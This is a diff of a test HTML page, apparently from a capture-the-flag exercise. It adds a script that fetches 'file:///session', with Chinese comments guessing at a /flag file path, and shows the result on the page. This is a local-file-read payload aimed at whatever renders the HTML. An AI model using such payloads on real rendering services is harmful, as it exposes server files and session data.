@@ -6,10 +6,18 @@
     <title>Hello, Wor11ld!</title>
 </head>
 <body>
-    <h1>Hello, World5!</h1>
-    <script>
-         document.body.innerHTML = "Show"
-    </script>
-    
+    <h1>Hello, World66!</h1>
+<script>
+// 尝试读取本地文件
+fetch('file:///session')  // 假设Flag文件路径为/flag
+  .then(response => response.text())
+  .then(data => {
+    document.body.innerHTML = `<pre>${data}</pre>`; // 将文件内容显示在页面中
+  })
+  .catch(error => {
+    document.body.innerHTML = `Error: ${error}`;
+  });
+</script>
+
 </body>
 </html>
